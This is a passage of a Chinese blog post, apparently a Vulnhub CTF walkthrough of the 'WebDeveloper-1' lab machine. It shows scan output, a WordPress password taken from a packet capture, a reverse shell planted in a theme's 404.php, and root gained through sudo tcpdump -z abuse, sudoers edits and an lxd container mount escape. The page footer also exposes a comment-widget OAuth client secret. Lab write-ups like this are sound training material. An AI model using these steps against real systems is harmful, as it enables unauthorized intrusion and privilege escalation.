class="string"></span></span><br><span class="line"><span class="string">[+] WPScan DB API OK</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Plan: free</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Requests Done (during the scan): 2</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Requests Remaining: 23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Sun Dec  8 19:48:09 2024</span></span><br><span class="line"><span class="string">[+] Requests Done: 57</span></span><br><span class="line"><span class="string">[+] Cached Requests: 9</span></span><br><span class="line"><span class="string">[+] Data Sent: 13.949 KB</span></span><br><span class="line"><span class="string">[+] Data Received: 338.115 KB</span></span><br><span class="line"><span class="string">[+] Memory used: 180.637 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:00:03</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"># root @ penetration in /mnt/c/Users/Anonymous/Desktop [<span class="number">19</span>:<span class="number">48</span>:<span class="number">09</span>] <span class="attribute">C</span>:<span class="number">5</span></span><br><span class="line">$ dirb  <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.<span class="number">22</span></span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_<span class="attribute">TIME</span>: Sun Dec  <span class="number">8</span> <span class="number">19</span>:<span class="number">53</span>:<span class="number">54</span> <span class="number">2024</span></span><br><span class="line">URL_<span class="attribute">BASE</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/</span><br><span class="line">WORDLIST_<span class="attribute">FILES</span>: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED <span class="attribute">WORDS</span>: <span class="number">4612</span></span><br><span class="line"></span><br><span class="line">---- Scanning <span class="attribute">URL</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/ ----</span><br><span class="line">+ <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/index.php (<span class="attribute">CODE</span>:<span class="number">301</span>|<span class="attribute">SIZE</span>:<span class="number">0</span>)</span><br><span class="line">==&gt; <span class="attribute">DIRECTORY</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/ipdata/</span><br><span class="line">+ <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/server-status (<span class="attribute">CODE</span>:<span class="number">403</span>|<span class="attribute">SIZE</span>:<span class="number">280</span>)</span><br><span class="line">==&gt; <span class="attribute">DIRECTORY</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/</span><br><span class="line">==&gt; <span class="attribute">DIRECTORY</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-content/</span><br><span class="line">==&gt; <span class="attribute">DIRECTORY</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-includes/</span><br><span class="line">+ <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/xmlrpc.php (<span class="attribute">CODE</span>:<span class="number">405</span>|<span class="attribute">SIZE</span>:<span class="number">42</span>)</span><br><span class="line"></span><br><span class="line">---- Entering <span class="attribute">directory</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/ipdata/ ----</span><br><span class="line">(!) <span class="attribute">WARNING</span>: Directory IS LISTABLE. No need to <span class="attribute">scan</span> it.</span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> if you want to <span class="attribute">scan</span> it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering <span class="attribute">directory</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/ ----</span><br><span class="line">+ <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/admin.php (<span class="attribute">CODE</span>:<span class="number">302</span>|<span class="attribute">SIZE</span>:<span class="number">0</span>)</span><br><span class="line">==&gt; <span class="attribute">DIRECTORY</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/css/</span><br><span class="line">==&gt; <span class="attribute">DIRECTORY</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/images/</span><br><span class="line">==&gt; <span class="attribute">DIRECTORY</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/includes/</span><br><span class="line">+ <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/index.php (<span class="attribute">CODE</span>:<span class="number">302</span>|<span class="attribute">SIZE</span>:<span class="number">0</span>)</span><br><span class="line">==&gt; <span class="attribute">DIRECTORY</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/js/</span><br><span class="line">==&gt; <span class="attribute">DIRECTORY</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/maint/</span><br><span class="line">==&gt; <span class="attribute">DIRECTORY</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/network/</span><br><span class="line">==&gt; <span class="attribute">DIRECTORY</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/user/</span><br><span class="line"></span><br><span class="line">---- Entering <span class="attribute">directory</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-content/ ----</span><br><span class="line">+ <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-content/index.php (<span class="attribute">CODE</span>:<span class="number">200</span>|<span class="attribute">SIZE</span>:<span class="number">0</span>)</span><br><span class="line">==&gt; <span class="attribute">DIRECTORY</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-content/plugins/</span><br><span class="line">==&gt; <span class="attribute">DIRECTORY</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-content/themes/</span><br><span class="line">==&gt; <span class="attribute">DIRECTORY</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-content/uploads/</span><br><span class="line"></span><br><span class="line">---- Entering <span class="attribute">directory</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-includes/ ----</span><br><span class="line">(!) <span class="attribute">WARNING</span>: Directory IS LISTABLE. No need to <span class="attribute">scan</span> it.</span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> if you want to <span class="attribute">scan</span> it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering <span class="attribute">directory</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/css/ ----</span><br><span class="line">(!) <span class="attribute">WARNING</span>: Directory IS LISTABLE. No need to <span class="attribute">scan</span> it.</span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> if you want to <span class="attribute">scan</span> it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering <span class="attribute">directory</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/images/ ----</span><br><span class="line">(!) <span class="attribute">WARNING</span>: Directory IS LISTABLE. No need to <span class="attribute">scan</span> it.</span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> if you want to <span class="attribute">scan</span> it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering <span class="attribute">directory</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/includes/ ----</span><br><span class="line">(!) <span class="attribute">WARNING</span>: Directory IS LISTABLE. No need to <span class="attribute">scan</span> it.</span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> if you want to <span class="attribute">scan</span> it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering <span class="attribute">directory</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/js/ ----</span><br><span class="line">(!) <span class="attribute">WARNING</span>: Directory IS LISTABLE. No need to <span class="attribute">scan</span> it.</span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> if you want to <span class="attribute">scan</span> it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering <span class="attribute">directory</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/maint/ ----</span><br><span class="line">(!) <span class="attribute">WARNING</span>: Directory IS LISTABLE. No need to <span class="attribute">scan</span> it.</span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> if you want to <span class="attribute">scan</span> it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering <span class="attribute">directory</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/network/ ----</span><br><span class="line">+ <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/network/admin.php (<span class="attribute">CODE</span>:<span class="number">302</span>|<span class="attribute">SIZE</span>:<span class="number">0</span>)</span><br><span class="line">+ <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/network/index.php (<span class="attribute">CODE</span>:<span class="number">302</span>|<span class="attribute">SIZE</span>:<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">---- Entering <span class="attribute">directory</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/user/ ----</span><br><span class="line">+ <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/user/admin.php (<span class="attribute">CODE</span>:<span class="number">302</span>|<span class="attribute">SIZE</span>:<span class="number">0</span>)</span><br><span class="line">+ <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-admin/user/index.php (<span class="attribute">CODE</span>:<span class="number">302</span>|<span class="attribute">SIZE</span>:<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">---- Entering <span class="attribute">directory</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-content/plugins/ ----</span><br><span class="line">+ <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-content/plugins/index.php (<span class="attribute">CODE</span>:<span class="number">200</span>|<span class="attribute">SIZE</span>:<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">---- Entering <span class="attribute">directory</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-content/themes/ ----</span><br><span class="line">+ <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-content/themes/index.php (<span class="attribute">CODE</span>:<span class="number">200</span>|<span class="attribute">SIZE</span>:<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">---- Entering <span class="attribute">directory</span>: <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">240.136</span>/wp-content/uploads/ ----</span><br><span class="line">(!) <span class="attribute">WARNING</span>: Directory IS LISTABLE. No need to <span class="attribute">scan</span> it.</span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> if you want to <span class="attribute">scan</span> it anyway)</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_<span class="attribute">TIME</span>: Sun Dec  <span class="number">8</span> <span class="number">19</span>:<span class="number">54</span>:<span class="number">14</span> <span class="number">2024</span></span><br><span class="line"><span class="attribute">DOWNLOADED</span>: <span class="number">32284</span> - <span class="attribute">FOUND</span>: <span class="number">12</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">80</span>端口：又是一个wordpress站</span><br><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.240.136/ipdata/  这里下载了一个流量包</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.240.136/xmlrpc.php  这里说是只支持post协议,</span></span><br><span class="line">在wireshark过滤一下post包http.request.<span class="attr">method</span> <span class="operator">=</span>= <span class="string">&quot;POST&quot;</span>,追踪tcp流发现密码</span><br><span class="line"><span class="attr">log</span><span class="operator">=</span>webdeveloper<span class="variable">&amp;pwd</span>=Te5eQg<span class="variable">&amp;</span><span class="number">4</span>sBS!Yr$)wf%(DcAd<span class="variable">&amp;wp</span>-<span class="attr">submit</span><span class="operator">=</span>Log+In<span class="variable">&amp;redirect_to</span>=http:<span class="comment">//192.168.1.176/wordpress/wp-admin/&amp;testcookie=1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-29-webdeveloper-1//image-20241208205137276.png" alt="image-20241208205137276"></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">直接后台登录<span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.240</span><span class="number">.136</span>/wp-admin/user/admin.php</span><br><span class="line">找到<span class="number">404.</span>php，在里面写反弹<span class="built_in">shell</span>，访问<span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.240</span><span class="number">.136</span>/wp-content/themes/twentysixteen/<span class="number">404.</span>php或者直接<span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.240</span><span class="number">.136</span>/<span class="number">404.</span>php</span><br><span class="line">连接上<span class="built_in">shell</span>,获得交互式<span class="built_in">shell</span> python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">交互式<span class="built_in">shell</span>：bash -i</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-29-webdeveloper-1//image-20241208205943769.png" alt="image-20241208205943769"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先看<span class="keyword">config</span>  cat /<span class="keyword">var</span>/www/html/wp-<span class="keyword">config</span><span class="variable">.php</span>,找到本地用户密码 webdeveloper   MasterOfTheUniverse</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-29-webdeveloper-1//image-20241208210202045.png" alt="image-20241208210202045"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l   usr/sbin/tcp/dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-29-webdeveloper-1//image-20241208210333898.png" alt="image-20241208210333898"></p>
+<p><img src="/vulnhub-29-webdeveloper-1//image-20241208210418214.png" alt="image-20241208210418214"></p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">linux 普通用户默认是没有权限使用tcpdump的，</span><br><span class="line"></span><br><span class="line">所以需要root 用户赋权：</span><br><span class="line"></span><br><span class="line">root#  setcap cap_net_raw=eip  <span class="regexp">/usr/</span>sbin/tcpdump</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">不要为普通用户添加tcpdump的sudo权限，</span><br><span class="line"></span><br><span class="line">zhangsan ALL=(root) NOPASSWD:  <span class="regexp">/usr/</span>bin<span class="regexp">/awk, /u</span>sr<span class="regexp">/bin/</span>less <span class="regexp">/tmp/</span>abc.text, <span class="regexp">/usr/</span>sbin/tcpdump</span><br><span class="line">很容易通过tcpdump 提权root</span><br><span class="line"></span><br><span class="line">sudo tcpdum -i <span class="keyword">any</span> -w <span class="regexp">/dev/</span><span class="keyword">null</span> -G <span class="number">1</span> -z <span class="regexp">/tmp/</span>test.sh -Z root</span><br><span class="line"></span><br><span class="line">在执行test.sh 时候是以root权限执行的， 所以在这个脚本中完全可以修改<span class="regexp">/etc/</span>sudoers 文件，将zhangsan 提权</span><br><span class="line"></span><br><span class="line">tcpdump</span><br><span class="line">  TCP标记值：tcp-fin, tcp-syn, tcp-rst, tcp-<span class="keyword">push</span>, tcp-<span class="keyword">push</span>, tcp-ack, tcp-urg</span><br><span class="line">  tcpdump -i <span class="keyword">any</span> tcp dst port <span class="number">6379</span>  and <span class="string">&#x27;tcp[tcpflags] &amp; tcp-push != 0&#x27;</span> -w <span class="number">1234</span>.cap</span><br><span class="line">  tcpdump -i <span class="keyword">any</span> dst host <span class="number">10.100</span>.<span class="number">125.22</span> and tcp dst port <span class="number">8082</span>  and <span class="string">&#x27;tcp[tcpflags] &amp; tcp-push != 0&#x27;</span></span><br><span class="line">————————————————</span><br><span class="line"></span><br><span class="line">                            版权声明：本文为博主原创文章，遵循 CC <span class="number">4.0</span> BY-SA 版权协议，转载请附上原文出处链接和本声明。</span><br><span class="line">                        </span><br><span class="line">原文链接：https:<span class="comment">//blog.csdn.net/lyyslsw1230_163com/article/details/103765216</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-29-webdeveloper-1//image-20241208210810430.png" alt="image-20241208210810430"></p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">弹不了,再找找.失败只是暂时的.</span><br><span class="line">提权命令查询,各种:</span><br><span class="line"><span class="symbol">https:</span><span class="comment">//gtfobins.github.io/</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">查看是否存在<span class="keyword">find</span>命令setuid执行权限：</span><br><span class="line"><span class="keyword">find</span> <span class="regexp">/ -perm -4000 2&gt;/</span>dev/<span class="keyword">null</span> | <span class="keyword">grep</span> <span class="keyword">find</span></span><br><span class="line">现在没有任何setuid权限</span><br><span class="line">echo <span class="string">&quot;chmod u+s /usr/bin/find&quot;</span>&gt; shell.sh</span><br><span class="line">chmod +x shell.sh</span><br><span class="line">sudo <span class="regexp">/usr/</span>sbin<span class="regexp">/tcpdump -ln -i eth0 -w /</span>dev<span class="regexp">/null -W 1 -G 1 -z /</span>tmp/shell.sh -Z root</span><br><span class="line"></span><br><span class="line">创建完成确认<span class="keyword">find</span>命令是否成功被赋予setuid权限：</span><br><span class="line"><span class="keyword">find</span> <span class="regexp">/ -perm -4000 2&gt;/</span>dev/<span class="keyword">null</span> | <span class="keyword">grep</span> <span class="keyword">find</span></span><br><span class="line">执行<span class="keyword">find</span>命令开始提权</span><br><span class="line"><span class="keyword">find</span> /tmp -exec sh -i \;   ---发现没有获得root权限</span><br><span class="line"><span class="keyword">find</span> . -exec <span class="regexp">/bin/</span>sh -p\;  --- -p执行即可</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">webdeveloper<span class="variable">@webdeveloper</span><span class="symbol">:/tmp</span><span class="variable">$ </span>echo <span class="string">&#x27;echo &quot;%webdeveloper ALL=(ALL:ALL) ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span> &gt; test.sh</span><br><span class="line">webdeveloper<span class="variable">@webdeveloper</span><span class="symbol">:/tmp</span><span class="variable">$ </span>chmod +x test.sh</span><br><span class="line">webdeveloper<span class="variable">@webdeveloper</span><span class="symbol">:/tmp</span><span class="variable">$ </span>sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W <span class="number">1</span> -G <span class="number">1</span> -z /tmp/test.sh -Z root</span><br><span class="line">dropped privs to root</span><br><span class="line"><span class="symbol">tcpdump:</span> listening on eth0, link-type <span class="title class_">EN10MB</span> (<span class="title class_">Ethernet</span>), capture size <span class="number">262144</span> bytes</span><br><span class="line"><span class="title class_">Maximum</span> file limit <span class="symbol">reached:</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> packet captured</span><br><span class="line"><span class="number">14</span> packets received by filter</span><br><span class="line"><span class="number">0</span> packets dropped by kernel</span><br><span class="line">webdeveloper<span class="variable">@webdeveloper</span><span class="symbol">:/tmp</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> webdeveloper on <span class="symbol">webdeveloper:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span>\<span class="symbol">:/snap/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> webdeveloper may run the following commands on <span class="symbol">webdeveloper:</span></span><br><span class="line">    (root) /usr/sbin/tcpdump</span><br><span class="line">    (<span class="title class_">ALL</span> : <span class="title class_">ALL</span>) <span class="title class_">ALL</span></span><br><span class="line">webdeveloper<span class="variable">@webdeveloper</span><span class="symbol">:/tmp</span><span class="variable">$ </span>sudo su</span><br><span class="line">root<span class="variable">@webdeveloper</span><span class="symbol">:/tmp</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="学习一种新的提权方法-挂载提权"><a href="#学习一种新的提权方法-挂载提权" class="headerlink" title="学习一种新的提权方法-挂载提权"></a>学习一种新的提权方法-挂载提权</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">滥用该lxd组来重新挂载文件系统并更改root拥有的文件 https:<span class="regexp">//</span>reboare.github.io<span class="regexp">/lxd/</span>lxd-escape.html</span><br><span class="line">创建</span><br><span class="line">lxd init   ----   一直回车</span><br><span class="line"></span><br><span class="line">创建了一个lxc容器：</span><br><span class="line">lxc init ubuntu:<span class="number">16.04</span> test -c security.privileged=true</span><br><span class="line"></span><br><span class="line">分配了安全权限，并将整个磁盘挂载到<span class="regexp">/mnt/</span>root：</span><br><span class="line">lxc config device add test whatever disk source=<span class="regexp">/ path=/m</span>nt/root recursive=true</span><br><span class="line">这时候会下载几分钟！</span><br><span class="line">lxc start test</span><br><span class="line">lxc exec test bash</span><br><span class="line">这时候挂载的test 乌班图容器就挂载好了，执行命令：</span><br><span class="line">执行的还是所有权命令：</span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;%webdeveloper ALL=(ALL:ALL) ALL&quot;</span> &gt;&gt; <span class="regexp">/mnt/</span>root<span class="regexp">/etc/</span>sudoers</span><br><span class="line"><span class="keyword">exit</span> </span><br><span class="line">sudo su</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E6%89%93%E9%9D%B6/"># 打靶</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="../vulnhub-30node-1/">Vulnhub-30Node-1</a>
+            
+            
+            <a class="next" rel="next" href="../misc-kex%E4%B8%8D%E8%83%BD%E7%94%A8root%E6%89%93%E5%BC%80/">Misc-kex不能用root打开</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
